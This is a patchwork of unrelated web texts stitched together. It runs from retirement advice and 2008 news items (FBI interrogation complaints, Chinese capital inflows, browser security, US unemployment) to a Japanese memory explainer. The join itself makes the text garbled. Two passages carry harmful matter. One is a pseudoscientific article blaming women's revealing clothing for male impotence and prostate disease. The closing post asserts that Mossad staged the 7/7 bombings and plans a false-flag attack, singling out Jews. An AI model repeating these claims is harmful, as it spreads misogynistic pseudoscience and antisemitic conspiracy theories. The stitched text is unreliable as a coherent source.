He has a BBA in Industrial Management from the University of Texas at Austin .
Social Security retirement benefits may be taxed depending upon your other ( non - SS ) income .
If combined income is greater than $ 25,000 for an individual ( $ 32,000 for married filers ) , up to 50 % of benefits may be taxable ; greater than $ 32,000 for an individual or $ 44,000 for a married couple , , up to 85 % of the benefit may be taxed .

The place we choose to live during retirement often depends upon the location of family and friends .
Many retirees , though , are opting to move to places with warmer climates and lower taxes .
If you are considering a move , you should consider the following :
Most workers take part in employer - provided 401 ( k ) plans or IRAs .
These are tax - advantaged plans that allow you to deduct contributions for income tax calculations .
The principal will grow , tax - deferred , until withdrawn from the plans .
Many people set unrealistic goals for themselves .
They expect that retirement will be the reward for employment .
Once you 've figured out how much you 'll need , set realistic goals and stick to them .
You can create a spreadsheet that includes all factors and calculates necessary retirement funds .
But , this is time - consuming and complicated .
A simpler approach is to use one of the many retirement income calculators free on the internet .
Once you know how much you 'll need , your next step is to consider how much you are likely to accumulate before retirement .
There are number of factors to think about , such as :
How much you need to retire will hinge on how long you will be retired for .
This means you 'll need to estimate how long you expect to live .
Any sums that must be available after your death reduces the amount available to you during your life .
This includes any money you wish to leave to a surviving spouse or heirs .
Many retirees want to see the world in their free time .
If this is something important to you , you 'll need to add this to your monthly cost estimates as well .
Many people have plans to pursue new interests or hobbies during retirement .
Many parents have continuing financial responsibilities for disabled children .
Others have health problems that will add expenses .
You should include these future costs in your projected retirement income need .
An important first step is to determine the amount necessary to cover basic living expenses each year .
There are different perspectives on how much this will be .
Plan for setbacks to your retirement savings plan .
For example , you might experience periods of unemployment .
Or , you might end up paying for higher education for yourself or your children .
If you do n't dip into whatever excess you have saved up , you 'll come out that much ahead .
If you do , you 'll still be on track for retirement .
Equity investments have traditionally earned at a higher rate than fixed income securities .
As a consequence , maintain a ratio of at least 80 /20 of equities in your investment portfolios .
Five years before retirement , begin decreasing the ratio of equities to fixed income .
On the day of retirement , your portfolio should reflect a 50/50 balance .
Retirement calculations are projections of future events .
They are based upon assumptions that may not be valid as time goes by .
Planning for retirement is an ongoing , active exercise .
It will require constant changes in assumptions and actions between today and your retirement .
Look into your insurance needs .
For example , think about investing in long - term care insurance to cover any time that you may have to spend in a nursing home .
Equity prices are volatile .
This means returns for any specific period are unknown , especially in the short - term .
Since 1930 , only 4 of 32 ten year periods had a negative returns .
The average annualized 10 year return for the S&P 500 from 1930 to 2013 was 9.7 % .
The lesson to here is to buy and hold the stocks of growing companies for long - term .
Be cautious about relying on Social Security benefits .
Social Security will replace 45 percent of income for most middle - income Americans .
The problem with Social Security is that no one knows how it will change in the coming years as the Baby Boomers retire .
Do n't get caught off - guard by assuming that Social Security will be there for your retirement .

FBI agents ' torture warnings ignored , Justice official says Report : NSC was deaf to complaints about treatment of terror suspects
WASHINGTON — FBI agents repeatedly complained that harsh interrogation techniques used on detainees in Iraq , Afghanistan and Guantanamo might violate the law and jeopardize future criminal trials , but administration officials did little to address the concerns , a government watchdog concluded in a report released Tuesday .
At one point in 2003 , several top Justice Department officials took the concerns about interrogation practices used by the military at Guantanamo to the National Security Council , Justice Department Inspector General Glenn Fine said in his report .
However , Fine said the complaints did not appear to trigger any response from the National Security Council , which includes President Bush and Vice President Dick Cheney and was chaired at the time by then - National Security Adviser Condoleezza Rice .
Although the FBI 's concerns were previously known , Fine 's report details how top law enforcement and military officials were slow to respond and how , in some instances , administration officials appear to have disregarded them .
Ashcroft mentioned
Several witnesses told Fine 's investigators then - Attorney General John Ashcroft also brought the matter to the attention of the National Security Council or the Pentagon , but Fine could n't verify the accounts because Ashcroft refused to be interviewed .
The 370 - page report took four years to complete , with its release delayed by the Pentagon 's attempt to keep a larger portion of the report classified , according to Fine .
The report describes how agents beginning in 2002 became deeply troubled by some of the interrogations they witnessed and details frequent clashes between agents and their military counterparts over the military 's and CIA 's use of harsh techniques that one agent described as " borderline torture . "
Broad policies adopted
In late 2002 , the military adopted broad interrogation policies that clashed with those permitted by the FBI .
Among the permitted techniques were hooding , putting prisoners in stress positions for as long as four hours , 20 - hour interrogations and removal of clothing .
FBI agents took part in interrogations in a few isolated cases " that would not normally be permitted in the United States , " Fine said .
A vast majority of the agents followed FBI policies and did not participate when other agencies used techniques that violated the bureau 's policies , Fine said .
Tuesday , Pentagon spokesman Bryan Whitman said the Pentagon found no evidence that interrogators tortured detainees during a 2005 review of techniques used at Guantanamo .
In a brief statement , Justice Department spokesman Brian Roehrkasse said the department was " pleased " that the report " credited the FBI for its conduct and professionalism during interrogations . "
Agents at Guantanamo , for example , witnessed and complained about the use of sleep deprivation , prolonged short - shackling , in which a detainee 's hands were shackled close to his feet , and detainees kept in rooms at extreme temperatures .
Drunk Redneck Insane Jeep Jump
[+]
A drunk redneck takes his Suzuki off a dirt jump at full speed .
Amazingly , it worked out perfectly .
The man who designed the Pringles potato crisp packaging system was so proud of his accomplishment that a portion of his ashes has been buried in one of the tall , circular cans .
Fredric J Baur , of Cincinnati , died May 4 at Vitas Hospice in Cincinnati , his family said .
He was 89 .
Baur 's children said they honoured his request to bury him in one of the cans by placing part of his cremated remains in a Pringles container in his grave in suburban Springfield Township .
The rest of his remains were placed in an urn buried along with the can , with some placed in another urn and given to a grandson , said Baur 's daughter , Linda Baur of Mississippi .
Baur requested the burial arrangement because he was proud of his design of the Pringles container , a son , Lawrence Baur , of Michigan , said on Monday .
Baur was an organic chemist and food storage technician who specialized in research and development and quality control for Cincinnati - based Procter & Gamble .
Baur filed for a patent for the tubular Pringles container and for the method of packaging the curved , stacked chips in the container in 1966 , and it was granted in 1970 , P&G archivist Ed Rider said .
Baur retired from P&G in the early 1980s .

「 コミット 」 「 アドレス 」 「 4GBの仮想アドレス空間」など、メモリーの周辺では難解な用語を目にする。知らなくてもメモリー増設作業に影響はないが、念のため解説しておこう。
まずは 「アドレス」という言葉から。パソコンに装着した物理的なメモリーには1バイトごとに番号が振られる。この番号をアドレス（番地）と呼ぶ。CPUはアドレス信号線から信号を出して物理的なアドレスを指定し、メモリーを読み書きする。
アドレス信号線が32本のCPUでは2の32乗＝4GBのアドレスを扱える（最近は36本のCPUもある）。ただ、このアドレスにはメインメモリー以外に周辺機器も含まれる。周辺機器の制御回路はCPUからメモリーの一種として扱われるからだ。デバイスマネージャで周辺機器のプロパティを見ると、上位2GB（16進数の80000000以上）の部分に割り当てられているのが分かる（図D）。
●周辺機器もメモリーの一種 d_spx445.jpg d_spx445.jpg
利用できるメインメモリーの量はCPUやチップセットなどのハードウエアとOSの仕様で決まる。通常の32ビット版Windowsは3.25GBが上限で、4GBのメモリーを装備してもシステムのプロパティなどでは3.25GBまでしか認識しない。うち、プロセスが使えるのは2GBまでだ。

“ It is known that there are an infinite number of worlds , simply because there is an infinite amount of space for them to be in .
However , not every one of them is inhabited .
Therefore , there must be a finite number of inhabited worlds .
Any finite number divided by infinity is as near to nothing as makes no odds , so the average population of all the planets in the Universe can be said to be zero .
From this it follows that the population of the whole Universe is also zero , and that any people you may meet from time to time are merely the products of a deranged imagination . ”
Men become impotent because of women 's low - cut dresses and bare legs
Russian physiologist Leonid Kitaev - Smyk has stated that most male diseases are caused by women who adhere to provocative clothes and behaviour .
As a result , the Western civilization gradually turns into the society of sexually unsatisfied men and eventually unsuccessful and physically unhealthy men , the scientist considers .
Men become impotent because of women 's low - cut dresses and bare legs
US researchers published results of their 30 - year - long work .
It suggested that 80 percent of men aged over 60 who died for different reasons had prostate cancer apart from other diseases .
Every third American and European male aged over 30 has problems with potency and the prostate gland .
The situation is quite different in the Muslim East .
Arabs have the lowest rates of prostate cancer .
Scientists considered that it depends on climate and meals and studied carefully the Oriental diet and tried to find any food with preventive action .
They failed , although the clue is quite obvious .
Since the start of the sexual revolution women of the developed world took to wearing revealing clothes , while Oriental women still wear gowns and yashmaks , said Leonid Kitaev - Smyk , the senior research officer of the Russian Research Institute of Culturology of the Russian Academy of Sciences .
In the street men cannot satisfy all desires they have .
They see naked parts of the body – miniskirts and transparent tops .
The modern fashion gives rise to male lust .
So there is much lust , but little satisfaction .
What does it have to do with the disease ?
We can draw an analogy with the fauna .
If a male is weak , a female will see it and reject the male .
This male cannot win a female , for there is a defensive mechanism in nature – this male suffers from prostatitis and impotency .
Nowadays , 70 percent of impotency is a natural defensive reaction to stresses caused by constant unsatisfied arousal .
But this reaction is rather long - standing .
Thus , women dig a grave for men ’s health with their bare legs and low - cut dresses .
Every nice girl going on a date with a sexy top on will make only one man happy and a dozen men on her way will suffer from her revealing looks .
In this case strippers are weapons of mass destruction ; they have already turned the Western civilization into the society with limited erection .
Sexologists made up the list of impotency - causing activities :
Scrutinizing internet pornography
Watching erotica and pornography on video
Staring at scantily - clad girls in the street
Reading erotic magazines
Going to striptease clubs

In an unmistakably insecure and aggressive move , the American Medical Association ( AMA ) adopted a resolution at its annual meeting last weekend to introduce legislation outlawing home birth .
In an unmistakably insecure and aggressive move , the American Medical Association ( AMA ) adopted a resolution at its annual meeting last weekend to introduce legislation outlawing home birth – according to The Big Push for Midwives .
According to the hard - working women of The Big Push for Midwives campaign , faced with the sisyphean task of convincing the American mainstream medical establishment that midwifery is a viable option for birthing women :
" It ’s unclear what penalties the AMA will seek to impose on women who choose to give birth at home , either for religious , cultural or financial reasons - or just because they did n’t make it to the hospital in time , " said Susan Jenkins , Legal Counsel for The Big Push for Midwives 2008 campaign .
" What we do know , however , is that any state that enacts such a law will immediately find itself in court , since a law dictating where a woman must give birth would be a clear violation of fundamental rights to privacy and other freedoms currently protected by the U.S. Constitution . "
In other words , advocating for legislation of this kind has the eery ring of familiarity .
Legislative attempts at " criminalizing motherhood " have at their core coercive control over pregnancy and childbirth .
Regina McKnight was recently released from jail after a judge overturned her homicide conviction for giving birth to a stillborn baby .

Likewise , Colorado ’s ballot initiative in support of a " personhood amendment " would have untold consequences for pregnant women who accidentally or otherwise miscarry a pregnancy .
If a fertilized egg is conferred " personhood " status why would a miscarriage not be investigated as potential murder ?
The legal issues surrounding " fundamental rights to privacy " also , of
course , reverberate throughout the discussions around Roe v. Wade and a
woman ’s right to have an abortion in this country .
Those who fight
rigorously to strip away womens ’ legal right to an abortion somehow
seem to skirt the issue of what might happen to a woman if she does
choose to access an illegal abortion .
What the AMA ’s resolution and these other kinds of potential and actual legislation do is to open the door to penalizing motherhood , in effect .
Because most of these legislative attempts do not directly address the issue , they leave the door dangerously open to criminalizing women for making the decisions they feel are best for themselves , their fetuses and their families .
Proposing this kind of legislation would also force women to birth in government - approved settings , a scenario that seems almost unbelievable .
According to the Big Push for MIdwives :
Until the AMA proposed ‘ Resolution 205 on Home Deliveries , ’ no state had considered legislation forcing women to deliver their babies in the hospital or limiting the choice of birth setting .
Instead , states have regulated the types of midwives that may legally provide care .
Currently , 22 states already license and regulate CPMs , who specialize in out - of - hospital maternity care and have received extensive training to qualify as experts in the types of risk assessment and preventive care necessary for safe and high - quality care for women who choose give birth at home .
Certified Nurse Midwives ( CNMs ) , who are trained primarily as hospital - based providers , are licensed in all 50 states and the District of Columbia .
The resolution did not offer any science - based information for the AMA ’s anti-midwife or anti-home birth position .
Steff Hedenkamp , Communications Coordinator for The Big Push for Midwives says , " Maternity care is a multi-billion dollar industry in the United States .
So it ’s no surprise to see the AMA join the American College of Obstetricians and Gynecologists in its ongoing fight to corner the market and ensure that the only midwives able to practice legally are hospital - based midwives forced to practice under physician control .
I will say , though , that I ’m shocked to learn that the AMA is taking this turf battle to the next level by setting the stage for outlawing home birth itself - a direct attack on those families who choose home birth , who could be subject to criminal prosecution if the AMA has its way . "
If you ’d like to help The Big Push for Midwives fight this please visit their web site and push back against attempts to " deny American families access to safe and legal midwifery care . "
Update , 2:45 pm , EDT : Wanted – Ricki Lake !
Apparently the AMA has issued Resolution 205 partially in response to none other than Ricki Lake and her campaign to promote midwifery and natural childbirth as a safe option for healthy women via her documentary , The Business of Being Born .
Safe Birth Ohio notes that , in Britain , mainstream medical associations like the Royal College of Gynecologists have come to very different conclusions about the safety of home birth as an option for healthy , laboring women .
And , yet , the AMA has swung the pendulum in the opposite direction deciding homebirth should be outlawed and that Ricki Lake is dangerous to mamas everywhere .

A POPULAR game this summer among watchers of the Chinese economy is to guess the size of speculative capital or “ hot money ” flowing into the country .
One clue is that although China 's trade surplus has started to shrink this year , its foreign - exchange reserves are growing at an ever faster pace .
The bulk of its net foreign - currency receipts now comes from capital inflows , not the current - account surplus .
According to leaked official figures , China 's foreign - exchange reserves jumped by $ 115 billion during April and May , to $ 1.8 trillion .
In the five months to May , reported reserves swelled by $ 269 billion , 20 % more than in the same period of last year .
But even this understates the true rate at which the People 's Bank of China ( PBOC ) has been piling up foreign exchange .
Logan Wright , a Beijing - based analyst at Stone & McCarthy , an economic - research firm , has done some statistical detective work to make sense of the figures .
The first problem is that reported reserves exclude the transfer of foreign exchange from the PBOC to the China Investment Corporation , the country 's sovereign - wealth fund .
The reserve figures have also been reduced in book - keeping terms this year by the PBOC “ asking ” banks to use dollars to pay for the extra reserves that they are now required to hold at the central bank .
Adding these two items to reported reserves , Mr Wright reckons that total foreign - exchange assets rose by an astonishing $ 393 billion in the first five months of 2008 ( see chart ) , more than double the increase in the same period last year .
China 's trade surplus and foreign direct investment ( FDI ) explain only 30 % of this .
Deducting investment income and the increase in the value of non-dollar reserves as the dollar has fallen still leaves an unexplained residual of $ 214 billion , equivalent to over $ 500 billion at an annual rate .
Some economists use this as a proxy for hot - money inflows .
But some of it may reflect non-speculative transactions , such as foreign borrowing by Chinese firms .
Mr Wright therefore estimates that China received up to $ 170 billion in hot money in the first five months of 2008 .
This far exceeds anything previously experienced by any emerging economy .
Michael Pettis , an economist at Peking University 's Guanghua School of Management , reckons that speculative inflows during that period were perhaps well over $ 200 billion , because hot money also comes into China through companies overstating FDI and over - invoicing exports .
Foreign firms are bringing in more capital than they need for investment : the net inflow of FDI is 60 % higher than a year ago , yet the actual use of this money for fixed investment has fallen by 6 % .
Some of it has been diverted elsewhere .
It is one thing to deduce how much money is coming in .
It is another to work out where it is going and how it gets past China 's strict capital controls .
The stockmarket , which continues to plunge ( see article ) , is no home for hot money .
Some has gone into property .
The lion 's share is in bog - standard bank deposits .
An interest rate of just over 4 % on yuan deposits compared with 2 % on dollars , combined with an expected appreciation in the yuan , offers a seemingly risk - free profit for those who can get money into China .
It comes in via various circuitous routes .
Big Western investment funds which care about liquidity would find it hard to move money into China , although rumours abound of hedge funds that are investing money through Chinese partners .
Trade and investment offers a big loophole for Chinese and foreign firms .
Resident individuals can use the $ 50,000 annual limit for bringing money into China from abroad — many also use their friends ' and relatives ' quotas .
Another big loophole lets Hong Kong residents transfer 80,000 yuan ( $ 11,600 ) a day into mainland bank deposits .
The government is trying to crack down , but that risks shifting the activity towards underground money exchangers .
And if the government were to increase its monitoring of FDI and trade flows , the extra bureaucracy could harm the real economy .
China needs to reduce the incentive for destabilising capital inflows , rather than block the channels .
Massive hot - money inflows present two dangers to China 's economy .
One is that capital could suddenly flow out , as it did from other East Asian countries during the financial crisis a decade ago and Vietnam this year .
China 's economy is protected by its current - account surplus and vast reserves , but its banking system would be hurt by an abrupt withdrawal .
A more immediate concern is that capital inflows will fuel inflation .
The more foreign capital that flows in , the more dollars the central bank must buy to hold down the yuan , which , in effect , means printing money .
It then mops up this excess liquidity by issuing bills ( as “ sterilisation ” ) or by lifting banks ' reserve requirements .
But all this complicates monetary policy .
China 's interest rates are below the inflation rate , but the PBOC fears that higher rates would attract yet more hot money and so end up adding to inflationary pressures .
The central bank has instead tried to curb inflation by allowing the yuan to rise at a faster pace against the dollar — by an annual rate of 18 % in the first quarter of this year .
But this encouraged investors to bet on future appreciation , exacerbating capital inflows .
Since April the pace of appreciation has been much reduced , in a vain effort to discourage speculators .
Mass sterilisation
Some economists argue that the problems caused by hot money have been exaggerated .
After all , the PBOC has so far succeeded in sterilising most of the increase in reserves .
Inflation , at an annual rate of 7.7 % in May , has also started to decline , and the impact of last week 's rise in fuel prices is likely to be offset over the next couple of months by falling food - price inflation .
The snag is that money - supply growth would explode without sterilisation , which is now close to its limit .
It is becoming very costly for the central bank to mop up liquidity by selling bills , so it is now relying more heavily on raising banks ' reserve requirements ( the PBOC pays banks only 1.9 % on their reserves , against over 4 % on bills ) .
Since January 2007 the minimum reserve ratio has been raised 16 times , from 9 % to 17.5 % .
But it cannot climb much higher without hurting banks ' profits .
To curb future inflation , China therefore needs to stem the flood of capital .
One solution would be a large one - off appreciation of the yuan so that investors no longer see it as a one - way bet .
This , in turn , would give the PBOC room to raise interest rates .
The snag is that the yuan would probably have to be wrenched perhaps 20 % higher to alter investors ' expectations , and this is unacceptable to Chinese leaders , especially when global demand has slowed and some exporters are already being squeezed .
This implies that monetary policy will remain too loose .
The longer that the torrent of hot money continues and interest rates remain too low , the bigger the risk that underlying inflation will creep up .
NEW YORK ( MarketWatch ) -- Ron Paul may be gone , but he should not be forgotten .
At this advanced stage of the presidential race , it probably seems bizarre that anyone would be writing about a guy who had as much of a chance to be president as Harold Stassen , who made nine unsuccessful bids for the Republican nomination between 1948 and 1992 .
Throughout the campaign , the media have treated Paul as a footnote .
Snickering pundits all but dismissed him as a cranky kook , in the tradition of another Lone Star State insurgent , Ross Perot .
Even when the mainstream publications covered him , you could imagine the assignment editors rolling their eyes in amusement , like parents patronizing a child .
Yet anyone who looked hard enough knew that there was more to Paul than an inability to amass delegates .
Most of the media , turned off by his shrill libertarian leanings , missed the real news value of Paul 's story -- namely , the Texas congressman 's ability to connect intensely with voters .
Successful fundraising
Paul certainly inspired them to open their wallets .
On Dec. 16 alone , Paul raised $ 6 million , which has been described as the biggest one - day take ever .
( It also yielded the coolest phrase to emerge from this campaign : " money bomb , " which refers to a grassroots fundraising effort over a brief fixed time period . )
According to the Washington Post , the dough came " from more than 50,000 donors , half of whom were new donors . "
The day after this burst of political funding , the Washington Post 's Web site noted that Paul 's " rock star status on the Internet had single - handedly fueled his campaign . "
In fact , no other candidate except Sen. Barack Obama used the Internet as effectively to his advantage .
The Post pointed out that Paul 's campaign also raked in $ 4.3 million on Nov. 5 , which is Guy Fawkes Day , marking " a symbol of rebellion in British history . "
The report also mentioned that Dec. 16 was the 234th anniversary of the Boston Tea Party .
The ardor of Paul 's peeps has n't dimmed .
As recently as March 26 , Elizabeth MacDonald , the stocks editor at Fox Business Network , wrote about Paul in her blog and received 411 reader comments .
( Hey , I 'd settle for one - fifth as many responses for this column , Media Web readers , so get to work ! )
" Thank you for finally getting a good word in about Ron Paul " and " Thank God someone 's showing some sense and finally listening to the man ! " were typical of the responses that MacDonald received .
( Fox , like MarketWatch , is a unit of News Corp. NWS , - 3.57 % . )
Focus on other candidates
Instead of writing much about Paul , the national media devoted a great deal of time and space to Rudy Giuliani , Fred Thompson and never - was candidate Michael Bloomberg , all of whom sizzled at various times in the race , but whose newsworthiness ultimately faded compared to Obama , Clinton and McCain .
Predictably , the media also focused almost entirely on " scoops " about the marquee candidates , even if their bulletins sometimes consisted of what the likely winners had for breakfast .
I 'm not suggesting that Paul should 've been covered as a candidate who might have threatened McCain in the Republican delegate count .
But the hard - core loyalty of his backers remains one of the most newsworthy , if unwritten , stories of this presidential campaign .
MEDIA WEB QUESTION OF THE DAY :
How would you rate the media 's coverage of Ron Paul 's 2008 campaign : a ) spot - on b ) patronizing c ) disappointing d) atrocious ?
FRIDAY STORY OF THE WEEK : " The Interpreter of Memories from The Killing Fields " by Elizabeth Becker ( Washington Post , April 1 ) :
This was the most eloquent testimonial to Dith Pran , an unsung hero of modern journalism who recently died of cancer at age 65 .
To Becker , Pran was the heroic " resourceful eyes and ears of New York Times reporter Sydney Schanberg " in the movie " The Killing Fields . "
Pran was the " quiet Cambodian employed by the aggressive American to interpret the language , culture and politics of Cambodia .
And it is Pran who risks his life over and over again for his friends as his country is blown to bits , motivated by courage , loyalty and love rather than a newspaper reporter 's deadline or sense of righteous indignation . "
Becker writes lovingly about a stranger who helped her do her job :
" Pran , the informal dean of the Cambodian press corps , watched me struggle for a few months .
When he was convinced I was something more than an American hippie , he took me under his wing .
First he made sure I had the wherewithal to do my job .
' Becker , ' he said .
' Take my car . '
For several months , Pran lent me his Volkswagen Beetle free , until I landed better employment than my $ 150 - a - month gig with a now defunct newsmagazine .
When I became the contract stringer for the Washington Post WPO , a competitor of his employer , the New York Times NYT , - 0.61 % , Pran said it did n't matter .
We were still colleagues .
We still shared news tips because then , as now , colleagues could die blundering down the wrong highway . "

User beware .
Today 's web browsers offer more security protections than ever , but according to security experts , they do little to protect people surfing the net from some the web 's oldest and most crippling threats .
Like nuclear stockpiles during the Cold War , new safety features amassed in Firefox , Internet Explorer and Opera are part of an arms - race mentality that leaves online criminal gangs plenty of room to launch attacks .
What 's more , the new protections often take years to be implemented and months to circumvent .
Meanwhile , shortcomings that have bedeviled all browsers since the advent of the World Wide Web go unaddressed .
Earlier this week , Mozilla patted itself on the back for adding a security feature to Version 3 of Firefox that 's of only marginal benefit its users .
It prevents users from accessing a list of websites known by Google , and possibly others , to be spreading malware .
Opera Software , in a move its CEO proclaimed " is reinventing Web - based threat detection , " added a similar feature to version 9.5 of its browser released two weeks ago , and Microsoft engineers are building malware blocking into IE 8 .
Here 's the rub :
According to our tests over the past week , the Firefox anti-malware feature frequently failed to block sites compromised by one of the most prevalent SQL injection exploits menacing the web .
Outcomes varied from minute to minute , but clicking on results returned from searches such as this and this ( we strongly recommend you do n't try this at home ) led us to dozens of compromised websites even with Firefox 's gee - whiz malware protection feature turned on .
Firefox 3 does block nihao11.com and the half - dozen or so other domain names that are referenced in the injection attack , so there is some benefit to the feature .
But its inability to flag a huge number of websites that have been compromised shows the limits to such an approach .
Similarly , researchers from Websense report here that they " found multiple phishing pages that still made it through " anti-phishing mechanisms that have existed for more than a year in Firefox .
Because they 're based on static blacklists based on behavior reported weeks or months earlier , these features often fail to detect quick - moving threats .
" These little anti-phishing things and anti-malware things , I 'm not buying them , " says Jeremiah Grossman , CTO of web application security firm WhiteHat Security .
" Are we less likely to get hacked as a result of these features ?
No .
If I was really the evil guy , I 'll send you to a hacked up blog page with Firefox 3 and you wo n't have a good day . "
Still waiting for Firefox to flag this site as a malware pusher
Meanwhile , within hours of Firefox 3 being released , researchers reported a security bug that could allow miscreants to execute hostile code on machines running the new browser .
Like IE , Opera and every other browser on the planet , Firefox also remains vulnerable to a variety of attacks that are as old as the World Wide Web .
They allow miscreants to inflict all kinds of damage , including stealing a user 's browsing history , spoofing trusted websites through cross -site scripting attacks ( XSS ) , stealing user authentication credentials to banking sites and providing easy access to corporate intranets and end - user machines .
Of course , browser makers are by no means alone in shouldering responsibility for these weaknesses .
Sharing equal amounts of blame are the eBays , MySpaces and Facebooks of the world for failing to resist the allure of untested features based on Adobe Flash and JavaScript , even when they deliver only minimal convenience over more traditional methods of delivering content .
Also culpable are netizens everywhere , who collectively reward all these websites for adding bells and whistles that put our safety in jeopardy .
" I would n't tell you not to use the internet , but I would certainly never tell you you 're safe , which is a pretty horrible thing to say to someone , " says Robert Hansen , CEO of secTheory , a security firm that specializes in security of web applications .
" I really do n't think people are in a good position from a technology perspective to defend themselves with what they 're given by default in a browser . "
Crisis of confidence
The situation is so dire in the minds of many security experts that they no longer trust any browser to keep them safe without taking extraordinary security measures .
Grossman , for example , uses Firefox with the NoScript , Flashblock , SafeHistory , Adblock Plus and CustomizeGoogle add - ons for most of his web surfing , all to improve on the less - than - ideal state of today 's web .
When visiting financial sites , he switches to an obscure browser that he refuses to name .
By treading off the beaten path , he says , he 's less likely to get hit by an exotic zero - day exploit , which can sell on the underground market for tens of thousands of dollars if it targets a popular browser .
The obscure browser " is technically not more or less secure , it 's just less targeted , which is the only thing I care about , " Grossman says .
As extreme as it may sound to some , Grossman says his browsing regimen is less hardcore than other people he knows in the security industry .
Indeed , some of the more paranoid have entire physical machines reserved solely for sensitive transactions , employ boot - only browsers via CD - ROMs , or use virtual machines with limited features for the same purpose .
" I have very low confidence in any of the browsers ' ability to keep me safe , " says Don Jackson , a researcher with security provider SecureWorks .
" What I have confidence in is the bad guys . "
One of the chief problems Jackson identifies with browser design these days : " Functionality is implemented first and security is tacked on . "

The road ( TGW ) – A new study concludes that producing enough energy for plug in hybrids and all electric vehicles could triple demand for water consumption .
Each mile driven with electricity consumes about three times more water ( 0.32 versus 0.07 - 0.14 gallons per mile ) than with gasoline , the study found .
" This is not to say that the negative impacts on water resources make such a shift undesirable , " King and Webber emphasized .
" Rather this increase in water usage presents a significant potential impact on regional water resources and should be considered when planning for a plugged - in automotive economy . "
The study was led by Carey W. King and Michael E. Webber .

The Arctic may contain as much as a fifth of the world ’s yet to - be - discovered oil and natural gas reserves , the United States Geological Survey said Wednesday as it unveiled the largest - ever survey of petroleum resources north of the Arctic Circle .
Oil companies have long suspected that the Arctic contained substantial energy resources , and have been spending billions recently to get their hands on tracts for exploration .
As melting ice caps have opened up prospects that were once considered too harsh to explore , a race has begun among Arctic nations , including the United States , Russia , and Canada , for control of these resources .
The geological agency ’s survey largely vindicates the rising interest .
It suggests that most of the yet - to - be found resources are not under the North Pole but much closer to shore , in regions that are not subject to territorial dispute .
“ For a variety of reasons , the possibility of oil and gas exploration in the Arctic has become much less hypothetical than it once was , ” Donald L. Gautier , the chief geologist for the survey , said during a news conference Wednesday .
“ Most of the resources are on the continental shelf in areas already under territorial claims . ”
Payrolls have fallen for a fifth month
The US unemployment rate rose at its fastest pace in more than two decades in May , stoking fears of recession in the world 's biggest economy .
The surprise jump in May 's jobless rate to 5.5 % from 5 % is the most recent signal yet that US growth is stalling .
It shows US companies are more reluctant to hire as profits are squeezed by a consumer slowdown and soaring oil and raw material costs .
The US Labor Department said the economy lost 49,000 non -farm jobs .
If you want to avoid a protracted recession , you have to make sure inflation does n't get out of control
Gilles Moec
Analyst , Bank of America
It follows a 28,000 decline in April , and will fuel fears the US economy is sliding towards recession , analysts said .
The worry is that a weak labour market will see consumers rein in their spending , hurting corporate profits .
The poor data rattled the stock market , with the blue - chip Dow Jones index sliding 1.79 % , or 225.70 points , to 12378.75 in afternoon trade in New York .
Cost of living
In recent months , the US Federal Reserve has been slashing interest rates in an attempt to stoke growth .
But analysts believe the rising cost of living , rather than interest rates , should be the US central bank 's chief concern now .
" If you want to avoid a protracted recession , you have to make sure inflation does n't get out of control , " said Gilles Moec , an analyst at Bank of America .
" Otherwise , you 're going to have a loss of purchasing power meaning consumer spending is going to slow down even more . "
Consumer spending is the engine of the US economy , and the latest jobless data is another set - back for Americans who are struggling with falling house prices , a credit squeeze and rising fuel bills .
Analysts said the figures came as a surprise : " The unemployment rate is the shocker , " said Bert Macintosh , chief economist at Eaton Vance Management .
" The unemployment rate gives you a much weaker economic outlook than the payrolls number , " he added .
Analysts had expected between 30,000 and 58,000 jobs to go .
In April , 28,000 non-farm jobs were lost , fewer than expected .

Tony of Bilderberg.org interviews Nathalie Bracht : Mossad ' toymaker ' cells planning false - flag attack on Consulate in Belfast Published on : June 26th , 2008 Modified on : November 18th , 2008 ON BEHALF OF TONY GOSLING : Mossad ' toymaker ' cells in British colleges ( under ' anarchist ' art student cover ) may now be planning ( arab looking ) bomb attack on US Consulate in Belfast original forum thread Tuesday 24th June approx .
1400 Tony Gosling and fiancee were stopped in their vehicle on the M32 motorway in Bristol by ten police officers under the authority of the Northumbria Police Major Incident Unit .
Gosling and fiancee were held at Trinity Road police station in Bristol until 1200 the next day , 25th June .
Both were heavily questioned .
They were each arrested three times , a total of six arrests .
The arrests in order were , Obstructing a Recovery Order , Theft of a Credit Card and then again for Obstructing a Recovery Order .
The two later arrests were made in the police station where they were still being detained for the first arrest .
The officers in command had come from Newcastle : DC 1077 Fairlamb ( M ) & DC 8558 Logan ( F ) Gosling states that he gave police the key to his home address in Bristol .
Officers battered his door down before proceeding to conviscate printed lists of contact details , two diaries , two mobile phones , a laptop and a desktop computer .
These items are still being held at this time .
Gosling feels he was threatened with precocious charges .
He states that he cooperated with police , but claims that his rights as a journalist were not respected .
All the charges were dropped shortly before Gosling and his fiancee were released .
Several locations in and around Bristol associated with Gosling were also raided by police .
The police are looking for a woman called Natalie Bracht - http://news.bbc.co.uk/1/hi/england/7419308.stm
Although Gosling states that he can not confirm that the information provided to him by Bracht is genuine , he does stress the importance of sharing her allegations .
The authorities have suggested that Bracht is suffering from mental illness and has threatened to kill her own children .
Gosling and others have met with Bracht and her five daughters .
They report normal behaviour between Bracht and her children - this would seemingly contradict police allegations .
It is not clear at this time , but Gosling believes they have found and arrested Bracht today .
Bracht 's allegations involve operations carried out on the British mainland by Israeli intelligence agents from Mossad .
In particular activities at the South Gosforth Reformed Synagogue in Newcastle .
According to Bracht she has been on the run from her home in Sunderland since Libyan intelligence officers warned her that the authorities were going to arrest her and place her children in care .
The Libyan agents told Bracht that her father was Moshe Baton ( spelling tbc ) an Israeli British intelligence officer who defected to Libya .
She believes that Mossad helped to carry out the July 7th bombings and that no Muslims are to blame .

News search for " Nathalie Bracht " on Google News ( propaganda alert ) TRANSCRIPT of the short clip ( by 100777.com ) [ Natalie Bracht ] : I 'm aware that the tube bombings down here in London are not in connection to any muslim activity at all , or with any arabic activity , put it this way .
I 'm aware that there are students accomondations down here in London , a couple of them , mostly covered up as being very anarchistic , very " left " , these students have knowledge in architecture , they are under camouflage of being art students , instead of architects .
They have technical equipment which is able to shut down surveillance .
They are also certain toymakers , these are people who have been formerly trained by the Israeli Military , most of them are also Russian speaking people , and there 's a huge number of ex soviet [ socalled ] jews who are doing this job .
I 'm expecting , and there are rumors going around , and I 'm aware of that two MP 's have already been informed about this ; they are expecting an attack on American soil in Ireland , possibly in Belfast , and it will be blamed on the Muslims .
This is to gain the support for another point in Israel from the United States and United Kingdom , and to look into the immigration problems that they obviously have in Ireland as well , so it 's affecting a lot of things .
And a huge number of people who are delivering , or doing this job are women instead of men .
[ Tony Gossling ] :
